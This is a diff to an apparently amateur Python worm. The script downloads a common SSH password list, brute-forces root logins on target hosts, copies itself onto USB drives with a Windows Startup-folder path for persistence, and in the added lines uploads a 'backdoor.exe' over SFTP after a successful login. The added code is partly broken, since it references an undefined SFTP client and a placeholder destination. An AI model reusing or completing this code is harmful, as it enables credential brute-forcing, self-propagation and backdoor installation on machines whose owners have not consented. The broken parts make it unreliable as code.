@@ -16,6 +16,7 @@ from ftplib import FTP
 import ftplib
 from shutil import copy2
 import win32api
+
 # ------------------- Logging ----------------------- #
 logger = logging.getLogger(__name__)
 coloredlogs.install(level='DEBUG', logger=logger)
@@ -93,7 +94,7 @@ def download_ssh_passwords(filename):
         filename - Name to save the file as.
     """
 
-    # TODO: This wordlist contains only few passwords. You would need a bigger one for real bruteforcing. \_(OwO)_/
+    # TODO:130 This wordlist contains only few passwords. You would need a bigger one for real bruteforcing. \_(OwO)_/
 
     logger.debug("Downloading passwords...")
     url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt"
@@ -102,7 +103,7 @@ def download_ssh_passwords(filename):
 
 
 def connect_to_ftp(host, username, password):
-    # TODO : Finish this function + Add bruteforcing
+    # TODO:30 : Finish this function + Add bruteforcing
     try:
         ftp = FTP(host)
         ftp.login(username, password)
@@ -124,7 +125,7 @@ def connect_to_ssh(host, password):
         password - Password to use
     """
 
-    # TODO: Pass usernames to the function too
+    # TODO:120 Pass usernames to the function too
 
     client = paramiko.SSHClient()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
@@ -132,6 +133,10 @@ def connect_to_ssh(host, password):
         logger.debug("Connecting to: " + host)
         client.connect(host, 22, "root", password)
         logger.debug("Successfully connected!")
+
+        sftp = s.open_sftp()
+        sftp.put('backdoor.exe', "destination") # change this.
+
         return True
     except socket.error:
         logger.error("Computer is offline or port 22 is closed")
@@ -154,16 +159,16 @@ def bruteforce_ssh(host, wordlist):
         wordlist - TXT file with passwords
 
     """
-    # TODO : Bruteforce usernames too
+    # TODO:10 : Bruteforce usernames too
     file = open(wordlist, "r")
     for line in file:
         connection = connect_to_ssh(host, line)
         print(connection)
         time.sleep(5)
 
-        
+
 def usbspreading():
-    # TODO : Make this threaded.
+    # TODO:50 : Make this threaded.
     bootfolder = os.path.expanduser('~') + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
 
     while True:
@@ -176,12 +181,6 @@ def usbspreading():
             else:
                 copy2(__file__, drive)
         time.sleep(3)
-
-
-def deploybackdoor():
-    # TODO : Add a backdoor/botnet/code that will be executed on these machines.
-    pass
-
 
 def main():
     download_ssh_passwords("passwords.txt")
